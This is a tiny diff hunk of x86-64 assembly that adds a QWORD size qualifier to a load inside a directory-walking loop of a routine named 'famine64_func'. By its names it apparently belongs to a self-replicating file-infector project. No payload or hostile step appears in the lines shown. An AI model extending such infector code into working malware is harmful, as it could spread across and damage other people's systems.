@@ -27,7 +27,7 @@ famine64_func:
 dir_loop:
 	mov		rax, QWORD [rsp]
 	lea		rdi, [rel dir_all]
-	mov		rdi, [rdi + rax * 8]
+	mov		rdi, QWORD [rdi + rax * 8]
 	cmp		rdi, 0
 	je		famine64_end
 	call	find_files
